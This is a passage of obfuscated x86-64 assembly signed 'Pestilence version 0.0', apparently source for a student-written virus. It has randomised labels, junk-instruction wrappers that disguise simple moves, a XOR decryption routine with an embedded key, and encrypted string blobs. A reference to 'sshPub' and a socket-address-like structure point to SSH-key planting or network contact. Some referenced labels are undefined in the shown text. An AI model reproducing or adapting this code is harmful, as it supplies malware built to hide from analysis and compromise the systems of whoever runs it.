call Ozm651xmq
push 0
call mov3
add rsp, 8
jmp aOvfi3N4
IrtqLUNF:
call Ozm651xmq
push -1
call mov2
add rsp, 8
jmp aOvfi3N4
;;**;;
mov2:
push rcx
push rdx
mov rcx, qword [rsp + 8 + 16]

mov rdx, -1
bzhi rax, rcx, rdx

pop rdx
pop rcx
ret
mov1:
push rcx
push rdx
mov rcx, qword [rsp + 8 + 16]

mov rdx, (64 << 8) | 0 ; flag pour le mov de bextr
bextr rax, rcx, rdx ; mov rax, rcx

pop rdx
pop rcx
ret
mov4:
push rbx
push rcx
mov rcx, qword [rsp + 8 + 16]

mov rax, 0
mov rbx, 0
cmpxchg rbx, rcx
mov rax, rbx
pop rcx
pop rbx
ret
mov3:
push rcx
push rbx
mov rbx, qword [rsp + 8 + 16]

mov rax, 0
mov rcx, 0x3d42f
cmpxchg rbx, rcx

pop rbx
pop rcx
ret
add1:
push rcx
mov rax, qword [rsp + 16 + 8]
mov rcx, qword [rsp + 8 + 8]

test rcx, rcx ; is rcx == 0 ?
jnz sub
jnc do_adc
jmp reverseCF

sub:
sub rcx, 1
jnc reverseCF ; Jump if Carry Flag is Not set (CF=0)
jmp do_adc ; Jump to ADC instruction
reverseCF: 
cmc ; Complement CF, making it 1
do_adc: ; Perform ADC with prepared carry flag
adc rax, rcx; RAX = RAX + rcx + CF

pop rcx
ret
; rax: int *_map_int_table( void )
_map_int_table:
; rax -> new map
push rdi
push rsi
push rdx
push r10
push r8
push r9
push SYS_MMAP
call mov1
add rsp, 8
push rax
push 0x0
call mov4
add rsp, 8
mov rdi, rax
pop rax
push rax
push 0x1d0
call mov3
add rsp, 8
mov rsi, rax
pop rax
push rax
push PROT_READ | PROT_WRITE
call mov4
add rsp, 8
mov rdx, rax
pop rax
push rax
push 0x22
call mov3
add rsp, 8
mov r10, rax
pop rax
push rax
push -1
call mov2
add rsp, 8
mov r8, rax
pop rax
push rax
push 0x0
call mov1
add rsp, 8
mov r9, rax
pop rax
syscall
cmp rax, -1
jl _end_map_int
movq xmm15, rax
mov dword [rax + 0], 0x00000000
mov dword [rax + 4], 0x00000000
mov dword [rax + 8], 0x00000000
mov dword [rax + 12], 0x00000000
mov dword [rax + 16], 0x00000000
mov dword [rax + 20], 0x00000000
mov dword [rax + 24], 0x00020000
mov dword [rax + 28], 0x00000000
mov dword [rax + 32], 0x00000000
mov dword [rax + 36], 0x00000000
mov dword [rax + 40], 0x00000000
mov dword [rax + 44], 0x00000000
mov dword [rax + 48], 0x00000000
mov dword [rax + 52], 0x00000000
mov dword [rax + 56], 0x00000000
mov dword [rax + 60], 0x00000000
mov dword [rax + 64], 0x00000000
mov dword [rax + 68], 0x00000000
mov dword [rax + 72], 0x00000000
mov dword [rax + 76], 0x00000000
mov dword [rax + 80], 0x00000100
mov dword [rax + 84], 0x00000000
mov dword [rax + 88], 0x00000000
mov dword [rax + 92], 0x00000000
mov dword [rax + 96], 0x00000000
mov dword [rax + 100], 0x00000000
mov dword [rax + 104], 0x00000000
mov dword [rax + 108], 0x00000000
mov dword [rax + 112], 0x00000000
mov dword [rax + 116], 0x00000000
mov dword [rax + 120], 0x00000000
mov dword [rax + 124], 0x00000000
mov dword [rax + 128], 0x00000000
mov dword [rax + 132], 0x00000000
mov dword [rax + 136], 0x00000000
mov dword [rax + 140], 0x00460000
mov dword [rax + 144], 0x00000000
mov dword [rax + 148], 0x00000000
mov dword [rax + 152], 0x00000000
mov dword [rax + 156], 0x00000000
mov dword [rax + 160], 0x00000000
mov dword [rax + 164], 0x00000000
mov dword [rax + 168], 0x00000000
mov dword [rax + 172], 0x00000000
mov dword [rax + 176], 0x00000000
mov dword [rax + 180], 0x00000000
mov dword [rax + 184], 0x00000000
mov dword [rax + 188], 0x00000000
mov dword [rax + 192], 0x00000000
mov dword [rax + 196], 0x00000000
mov dword [rax + 200], 0x00000000
mov dword [rax + 204], 0x00000000
mov dword [rax + 208], 0x00000098
mov dword [rax + 212], 0x00000000
mov dword [rax + 216], 0x00000000
mov dword [rax + 220], 0x00000000
mov dword [rax + 224], 0x00000000
mov dword [rax + 228], 0x02030000
mov dword [rax + 232], 0x00000000
mov dword [rax + 236], 0x00000000
mov dword [rax + 240], 0x00000000
mov dword [rax + 244], 0x00000000
mov dword [rax + 248], 0x00000000
mov dword [rax + 252], 0x00000000
mov dword [rax + 256], 0x004c0000
mov dword [rax + 260], 0x00000000
mov dword [rax + 264], 0x00000000
mov dword [rax + 268], 0x00000000
mov dword [rax + 272], 0x00021000
mov dword [rax + 276], 0x00000000
mov dword [rax + 280], 0x00000000
mov dword [rax + 284], 0x00000000
mov dword [rax + 288], 0x00000000
mov dword [rax + 292], 0x0000004b
mov dword [rax + 296], 0x00000000
mov dword [rax + 300], 0x00000000
mov dword [rax + 304], 0x00000000
mov dword [rax + 308], 0x40000000
mov dword [rax + 312], 0x0000001f
mov dword [rax + 316], 0x00000000
mov dword [rax + 320], 0x00000000
mov dword [rax + 324], 0x00000096
mov dword [rax + 328], 0x00000000
mov dword [rax + 332], 0x00000000
mov dword [rax + 336], 0x00000000
mov dword [rax + 340], 0x00000000
mov dword [rax + 344], 0x17290000
mov dword [rax + 348], 0x6e000040
mov dword [rax + 352], 0x00000001
mov dword [rax + 356], 0x00000101
mov dword [rax + 360], 0x2e010100
mov dword [rax + 364], 0x02010001
mov dword [rax + 368], 0x00000000
mov dword [rax + 372], 0x00450100
mov dword [rax + 376], 0x01200000
mov dword [rax + 380], 0x00010100
mov dword [rax + 384], 0x01000001
mov dword [rax + 388], 0x00580005
mov dword [rax + 392], 0x0100010a
mov dword [rax + 396], 0x00100101
mov dword [rax + 400], 0x0001010a
mov dword [rax + 404], 0x02c8c823
mov dword [rax + 408], 0x0100004f
mov dword [rax + 412], 0x00000100
mov dword [rax + 416], 0x30090a01
mov dword [rax + 420], 0x0900003c
mov dword [rax + 424], 0x1e010000
mov dword [rax + 428], 0x0a0c7e40
mov dword [rax + 432], 0x0d000a0d
mov dword [rax + 436], 0x000a0c0a
mov dword [rax + 440], 0x0b08037f
mov dword [rax + 444], 0x2d2c2a29
mov dword [rax + 448], 0x00d9654d
mov dword [rax + 452], 0x00400201
mov dword [rax + 456], 0x13120804
mov dword [rax + 460], 0x61810717
_end_map_int:
pop r9
pop r8
pop r10
pop rdx
pop rsi
pop rdi
ret
; rax: char *_decrypt_str(rsi: char *to_decrypt, rdi: len)
_decrypt_str:
; rax == div quotient
; rbx -> to_decrypt
; rcx == counter
; rdx == div modulo
; r9 == len I9h3dTtNKW
; r10 -> key_char
; r11 -> decrypted str (mmap)
; r12 == len to_decrypt
; rsi -> I9h3dTtNKW
push rbx
push rcx
push rdx
push r8
push r9
push r10
push r11
push r12
push rax
push rdi
call mov2
add rsp, 8
mov rbx, rax
pop rax
push rax
push rsi
call mov1
add rsp, 8
mov r12, rax
pop rax
; addr = NULL (let kernel choose)
xor rdi, rdi 
; PROT_READ | PROT_WRITE = 1 | 2 = 3
push rax
push 0x03
call mov4
add rsp, 8
mov rdx, rax
pop rax
; MAP_PRIVATE | MAP_ANONYMOUS = 0x2 | 0x20 = 0x22
push rax
push 0x22
call mov3
add rsp, 8
mov r10, rax
pop rax
; rwpA8dhMq = -1
push rax
push -1
call mov3
add rsp, 8
mov r8, rax
pop rax
; offset = 0
xor r9, r9 
; syscall number for mmap
push 9
call mov2
add rsp, 8
syscall
cmp rax, 0
jl _decrypt_loop_end
push rax
push rax
call mov1
add rsp, 8
mov r11, rax
pop rax
lea rsi, I9h3dTtNKW
call lzPBWI0L
push rax
push rax
call mov4
add rsp, 8
mov r9, rax
pop rax
xor rcx, rcx
xor rdx, rdx
_decrypt_loop:
cmp rcx, r12
jge _decrypt_loop_end
push rcx
call mov4
add rsp, 8
xor rdx, rdx
cmp rcx, 0
jne _no_zero
xor rax, rax
jmp _end_div
_no_zero:
div r9
_end_div:
; r10 == I9h3dTtNKW[rcx % I9h3dTtNKW_len]
movzx r10, byte [rsi + rdx] 
xor r10b, [rbx+rcx]
mov [r11+rcx], r10b
inc rcx
jmp _decrypt_loop
_decrypt_loop_end:
push r11
call mov1
add rsp, 8
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdx
pop rcx
pop rbx
ret
; strcpy(dst:rsi src: rdi)
f95ZQpA3:
xor rcx, rcx
ESphYxEfvV:
cmp byte[rdi + rcx], 0 
je qzByTk
mov al, byte[rdi+rcx]
mov byte [rsi+rcx], al
push rax
push rcx
push 1
call add1
add rsp, 8
pop rcx
mov rcx, rax
pop rax
jmp ESphYxEfvV
qzByTk:
ret
HOmW8jN:
call f95ZQpA3
mov byte [rsi + rcx], 0 
ret
; strncpy(dst:rsi, src: rdi, count: rcx)
HUs658Gp:
sub rcx, 1 
Sm0ewguWS:
mov al, byte[rdi+rcx]
mov byte [rsi + rcx], al
loop Sm0ewguWS
mov al, byte[rdi+rcx]
mov byte [rsi + rcx], al
ret
; strlen(str:rsi)
lzPBWI0L:
xor rcx, rcx
A5GC13b:
cmp byte [rsi + rcx], 0 
je euTLKdI
inc rcx
jmp A5GC13b
euTLKdI:
push rcx
call mov3
add rsp, 8
ret
; strcmp(rdi, rsi)
CvLYMAYQ5:
xor rcx, rcx
xor rax, rax
Ipizf:
mov al, byte[rdi+rcx]
mov bl, byte[rsi+rcx]
cmp al, bl
jl e2KeMJMh4
je e2KeMJMh4
jg e2KeMJMh4
cmp al, 0 
je e2KeMJMh4
push rax
push rcx
push 1
call add1
add rsp, 8
pop rcx
mov rcx, rax
pop rax
jmp Ipizf
e2KeMJMh4:
movzx rax, al
movzx r8, bl
sub rax, r8
ret
; int itoa(rax:int, rsi:*buffer)
; (a la fin rsi pointe sur le byte d'apres)
nQScOYAb:
push rax
push 10
call mov2
add rsp, 8
mov r9, rax
pop rax
call Cv9Gr
ret
Cv9Gr:
cmp rax, 9 
jg i21jPjD
push rax
push ax
call mov4
add rsp, 8
mov [rsi], rax
pop rax
add byte [rsi], 48 
inc rsi
ret
i21jPjD:
push rax
xor rdx, rdx
div r9
call Cv9Gr 
pop rax
push rax
xor rdx, rdx
div r9
push rdx
call mov1
add rsp, 8
call Cv9Gr 
pop rax
ret
push rax
push rax
call mov3
add rsp, 8
mov [rsi + rcx], rax
pop rax
jc6dsjkGsi:
mov rdi, INF(X703hy1rZ.jS6sH4kx)
mov rsi, INF(X703hy1rZ.nGwh0I24)
push SYS_UNMAP
call mov2
add rsp, 8
syscall
jmp vNfN5Ue
vNfN5Ue:
push SYS_CLOSE
call mov4
add rsp, 8
mov rdi, INF(X703hy1rZ.qz9giR)
syscall
mov qword INF(X703hy1rZ.qz9giR), -1
jmp aOvfi3N4
lwmZqy:
push 60
call mov1
add rsp, 8
xor rdi, rdi
syscall
LeqAx db 0x1C, 0x00, 0x06, 0x59, 0x58, 0x22, 0x0A, 0x43, 0x39, 0x4E
UsjUXZli1C equ $ - LeqAx
IU6f1 db 0x1C, 0x00, 0x06, 0x59, 0x58, 0x22, 0x0A, 0x43, 0x39, 0x7C, 0x34
JksxN equ $ - IU6f1
I9h3dTtNKW db 0x33, 0x74, 0x6B, 0x29, 0x77, 0x56, 0x6F, 0x30, 0x4D, 0x4E, 0x34
KnlWTHf db 9, 0 
SpcErZb8C db 0x1C, 0x74
XdOzA0DA db 0x1C, 0x06, 0x04, 0x46, 0x03, 0x79, 0x41, 0x43, 0x3E, 0x26, 0x1B, 0x11, 0x46, 0x00, 0x03, 0x46, 0x05, 0x3F, 0x15, 0x55, 0x29, 0x11, 0x5F, 0x15, 0x4A, 0x07, 0x6B
W2nvO equ $ - XdOzA0DA
JzE82 db 0x40, 0x07, 0x03, 0x04, 0x12, 0x32, 0x5D, 0x05, 0x78, 0x7F, 0x0C, 0x50, 0x72, 0x35, 0x2A, 0x68, 0x34, 0x65, 0x21, 0x4A, 0x2C, 0x0D, 0x05, 0x1C, 0x69, 0x30, 0x22, 0x18, 0x39, 0x02, 0x2A, 0x05, 0x0C, 0x0F, 0x75, 0x31, 0x7A, 0x3F, 0x08, 0x5A, 0x33, 0x34, 0x06, 0x4A, 0x2C, 0x7D, 0x60, 0x03, 0x05, 0x36, 0x52, 0x7D, 0x07, 0x35, 0x0A, 0x58, 0x35, 0x24, 0x6D, 0x48, 0x43, 0x17, 0x3B, 0x40, 0x1D, 0x38, 0x2B, 0x48, 0x0F, 0x3E, 0x41, 0x19, 0x76, 0x1F, 0x04, 0x5D, 0x25, 0x15, 0x01, 0x00, 0x6D, 0x29, 0x5B, 0x04, 0x47, 0x1D, 0x0E, 0x69, 0x13, 0x33, 0x0D, 0x59, 0x2C, 0x20, 0x34
B197bFv91K equ $-sshPub
Ap5WD2EbFi:
	FOkRm6 1 
	FOkRm6 0x401E 
	gJZxpBX 0x100007E 
; padding
ASt2X34 -1 
ZryyY equ $ - Ap5WD2EbFi
rKANABrqt db 0x63, 0x3B, 0x38, 0x7D, 0x57, 0x79, 0x0A, 0x48, 0x39, 0x3C, 0x55, 0x13, 0x47, 0x54, 0x23, 0x7D, 0x23, 0x06, 0x40, 0x00, 0x63, 0x7F, 0x68, 0x02, 0x6F, 0x1A, 0x23, 0x46, 0x04, 0x22, 0x55, 0x10, 0x7C, 0x7C, 0x02, 0x5E, 0x03, 0x5A, 0x5B, 0x07, 0x46, 0x6C, 0x57, 0x00, 0x7D, 0x7E, 0x68, 0x02, 0x6F, 0x1A, 0x28, 0x46, 0x19, 0x22, 0x0A, 0x5E, 0x39, 0x63, 0x60, 0x09, 0x43, 0x11, 0x51, 0x09, 0x03, 0x33, 0x17, 0x44, 0x62, 0x3E, 0x58, 0x11, 0x5A, 0x1A, 0x37, 0x4F, 0x2B, 0x38, 0x2C, 0x5F, 0x23, 0x3A, 0x51, 0x1E, 0x47, 0x59, 0x27, 0x4C, 0x19, 0x31, 0x1B, 0x58, 0x77, 0x6E, 0x34
nUQR8D equ $-headerStart
SKasW db 12, 10, 13, 10, 0 
hhcTDSu equ $-headerEnd
XTZsIZO db 0x74, 0x31, 0x3F, 0x09, 0x58, 0x3F, 0x01, 0x56, 0x28, 0x2D, 0x40, 0x19, 0x5C, 0x1A, 0x4B, 0x61, 0x23, 0x02, 0x3F, 0x1F, 0x7D, 0x60, 0x05, 0x2C, 0x41, 0x28, 0x05, 0x61, 0x18, 0x25, 0x1B, 0x0A, 0x6D, 0x7F, 0x06, 0x46, 0x1D, 0x44, 0x45, 0x19, 0x59, 0x67, 0x55, 0x08, 0x7D, 0x7E, 0x04, 0x70, 13, 10, 12, 10
YOFxT equ $ - XTZsIZO
vJBLbia:
; Secondes
ASt2X34 -1 
ASt2X34 9999999 
haXw6ThsV db "Pestilence version 0.0 (c)oded by anvincen-eedy", 0x0 
ENiCO4ir equ $ - haXw6ThsV
IDsDM:
